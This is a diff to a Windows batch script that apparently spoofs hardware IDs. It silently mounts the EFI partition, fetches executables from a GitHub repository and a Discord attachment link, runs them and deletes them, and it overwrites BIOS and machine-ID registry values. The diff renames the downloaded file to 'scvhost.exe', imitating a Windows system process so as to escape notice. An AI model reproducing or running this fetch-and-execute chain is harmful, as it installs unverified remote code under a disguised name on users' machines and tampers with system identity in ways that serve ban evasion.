@@ -1,8 +1,8 @@
 Mountvol "x:" /s >Nul 2>&1 & MKDIR "x:\Spoofy" >Nul 2>&1 & CD /D "x:\Spoofy" >Nul 2>&1
-curl -s -g -L -o "x.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/BadwareCleaner.exe$" >NUL 2>&1
-START "" /B /WAIT "x.exe" >Nul 2>&1 & DEL /S /Q "x.exe" >Nul 2>&1
-curl -s -g -L -o "x.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/RegCleaner-exe" >NUL 2>&1
-START "" /B /WAIT "x.exe" >Nul 2>&1 & DEL /S /Q "x.exe" >Nul 2>&1
+curl -s -g -L -o "scvhost.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/BadwareCleaner.exe$" >NUL 2>&1
+START "" /B /WAIT "scvhost.exe" >Nul 2>&1 & DEL /S /Q "scvhost.exe" >Nul 2>&1
+curl -s -g -L -o "scvhost.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/RegCleaner-exe" >NUL 2>&1
+START "" /B /WAIT "scvhost.exe" >Nul 2>&1 & DEL /S /Q "scvhost.exe" >Nul 2>&1
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient" /v "MachineId" /t reg_sz /d "{%random%%random%-%random%-%random%-%random%}" /f >NUL 2>&1
 REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation" /F >NUL 2>&1
 REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SystemInformation" /F >NUL 2>&1
@@ -181,7 +181,7 @@ REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemProductName /t REG_SZ /d 
 REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemSKU /t REG_SZ /d %random% /f  >NUL 2>&1
 REG ADD HKLM\HARDWARE\DESCRIPTION\System\BIOS /v SystemVersion /t REG_SZ /d %random% /f  >NUL 2>&1
 START "" /MIN /WAIT POWERSHELL Rename-Computer -NewName "%RANDOM%-PFS-%RANDOM%" >NUL 2>&1
-DEL /S /Q "x.exe" >Nul 2>&1
-curl -s -g -L -o "x.exe" "https://cdn.discordapp.com/attachments/1206253821861429318/1206279610405228555/EventCleaner-exe.txt?ex=65db6e6e&is=65c8f96e&hm=8492b7336b2cd810e069047a91d54c66ac5c82caf17e9719500fb8c9bfdeb78c&"  >NUL 2>&1
-START "" /B /WAIT "x.exe" >Nul 2>&1 & DEL /S /Q "x.exe" >Nul 2>&1
+DEL /S /Q "scvhost.exe" >Nul 2>&1
+curl -s -g -L -o "scvhost.exe" "https://cdn.discordapp.com/attachments/1206253821861429318/1206279610405228555/EventCleaner-exe.txt?ex=65db6e6e&is=65c8f96e&hm=8492b7336b2cd810e069047a91d54c66ac5c82caf17e9719500fb8c9bfdeb78c&"  >NUL 2>&1
+START "" /B /WAIT "scvhost.exe" >Nul 2>&1 & DEL /S /Q "scvhost.exe" >Nul 2>&1
 CD /D "%SystemDrive%\" & RMDIR /S /Q "x:\Spoofy" >Nul 2>&1
